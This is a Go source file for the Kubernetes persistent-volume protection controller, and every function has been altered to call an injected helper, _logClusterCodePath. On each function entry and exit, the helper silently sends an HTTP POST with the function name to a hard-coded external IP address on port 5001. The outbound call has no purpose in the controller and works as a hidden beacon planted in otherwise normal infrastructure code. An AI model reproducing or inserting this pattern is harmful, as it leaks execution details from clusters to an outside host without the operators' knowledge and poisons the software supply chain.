package pvprotection

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "time"
 "k8s.io/api/core/v1"
 apierrs "k8s.io/apimachinery/pkg/api/errors"
 utilruntime "k8s.io/apimachinery/pkg/util/runtime"
 "k8s.io/apimachinery/pkg/util/wait"
 coreinformers "k8s.io/client-go/informers/core/v1"
 clientset "k8s.io/client-go/kubernetes"
 corelisters "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/client-go/util/workqueue"
 "k8s.io/klog"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/kubernetes/pkg/util/metrics"
 "k8s.io/kubernetes/pkg/util/slice"
 volumeutil "k8s.io/kubernetes/pkg/volume/util"
)

type Controller struct {
 client                              clientset.Interface
 pvLister                            corelisters.PersistentVolumeLister
 pvListerSynced                      cache.InformerSynced
 queue                               workqueue.RateLimitingInterface
 storageObjectInUseProtectionEnabled bool
}

func NewPVProtectionController(pvInformer coreinformers.PersistentVolumeInformer, cl clientset.Interface, storageObjectInUseProtectionFeatureEnabled bool) *Controller {
 _logClusterCodePath()
 defer _logClusterCodePath()
 e := &Controller{client: cl, queue: workqueue.NewNamedRateLimitingQueue(workqueue.DefaultControllerRateLimiter(), "pvprotection"), storageObjectInUseProtectionEnabled: storageObjectInUseProtectionFeatureEnabled}
 if cl != nil && cl.CoreV1().RESTClient().GetRateLimiter() != nil {
  metrics.RegisterMetricAndTrackRateLimiterUsage("persistentvolume_protection_controller", cl.CoreV1().RESTClient().GetRateLimiter())
 }
 e.pvLister = pvInformer.Lister()
 e.pvListerSynced = pvInformer.Informer().HasSynced
 pvInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{AddFunc: e.pvAddedUpdated, UpdateFunc: func(old, new interface{}) {
  e.pvAddedUpdated(new)
 }})
 return e
}
func (c *Controller) Run(workers int, stopCh <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defer utilruntime.HandleCrash()
 defer c.queue.ShutDown()
 klog.Infof("Starting PV protection controller")
 defer klog.Infof("Shutting down PV protection controller")
 if !controller.WaitForCacheSync("PV protection", stopCh, c.pvListerSynced) {
  return
 }
 for i := 0; i < workers; i++ {
  go wait.Until(c.runWorker, time.Second, stopCh)
 }
 <-stopCh
}
func (c *Controller) runWorker() {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for c.processNextWorkItem() {
 }
}
func (c *Controller) processNextWorkItem() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pvKey, quit := c.queue.Get()
 if quit {
  return false
 }
 defer c.queue.Done(pvKey)
 pvName := pvKey.(string)
 err := c.processPV(pvName)
 if err == nil {
  c.queue.Forget(pvKey)
  return true
 }
 utilruntime.HandleError(fmt.Errorf("PV %v failed with : %v", pvKey, err))
 c.queue.AddRateLimited(pvKey)
 return true
}
func (c *Controller) processPV(pvName string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 klog.V(4).Infof("Processing PV %s", pvName)
 startTime := time.Now()
 defer func() {
  klog.V(4).Infof("Finished processing PV %s (%v)", pvName, time.Since(startTime))
 }()
 pv, err := c.pvLister.Get(pvName)
 if apierrs.IsNotFound(err) {
  klog.V(4).Infof("PV %s not found, ignoring", pvName)
  return nil
 }
 if err != nil {
  return err
 }
 if isDeletionCandidate(pv) {
  isUsed := c.isBeingUsed(pv)
  if !isUsed {
   return c.removeFinalizer(pv)
  }
 }
 if needToAddFinalizer(pv) {
  return c.addFinalizer(pv)
 }
 return nil
}
func (c *Controller) addFinalizer(pv *v1.PersistentVolume) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !c.storageObjectInUseProtectionEnabled {
  return nil
 }
 pvClone := pv.DeepCopy()
 pvClone.ObjectMeta.Finalizers = append(pvClone.ObjectMeta.Finalizers, volumeutil.PVProtectionFinalizer)
 _, err := c.client.CoreV1().PersistentVolumes().Update(pvClone)
 if err != nil {
  klog.V(3).Infof("Error adding protection finalizer to PV %s: %v", pv.Name, err)
  return err
 }
 klog.V(3).Infof("Added protection finalizer to PV %s", pv.Name)
 return nil
}
func (c *Controller) removeFinalizer(pv *v1.PersistentVolume) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pvClone := pv.DeepCopy()
 pvClone.ObjectMeta.Finalizers = slice.RemoveString(pvClone.ObjectMeta.Finalizers, volumeutil.PVProtectionFinalizer, nil)
 _, err := c.client.CoreV1().PersistentVolumes().Update(pvClone)
 if err != nil {
  klog.V(3).Infof("Error removing protection finalizer from PV %s: %v", pv.Name, err)
  return err
 }
 klog.V(3).Infof("Removed protection finalizer from PV %s", pv.Name)
 return nil
}
func (c *Controller) isBeingUsed(pv *v1.PersistentVolume) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if pv.Status.Phase == v1.VolumeBound {
  return true
 }
 return false
}
func (c *Controller) pvAddedUpdated(obj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pv, ok := obj.(*v1.PersistentVolume)
 if !ok {
  utilruntime.HandleError(fmt.Errorf("PV informer returned non-PV object: %#v", obj))
  return
 }
 klog.V(4).Infof("Got event on PV %s", pv.Name)
 if needToAddFinalizer(pv) || isDeletionCandidate(pv) {
  c.queue.Add(pv.Name)
 }
}
func isDeletionCandidate(pv *v1.PersistentVolume) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pv.ObjectMeta.DeletionTimestamp != nil && slice.ContainsString(pv.ObjectMeta.Finalizers, volumeutil.PVProtectionFinalizer, nil)
}
func needToAddFinalizer(pv *v1.PersistentVolume) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return pv.ObjectMeta.DeletionTimestamp == nil && !slice.ContainsString(pv.ObjectMeta.Finalizers, volumeutil.PVProtectionFinalizer, nil)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
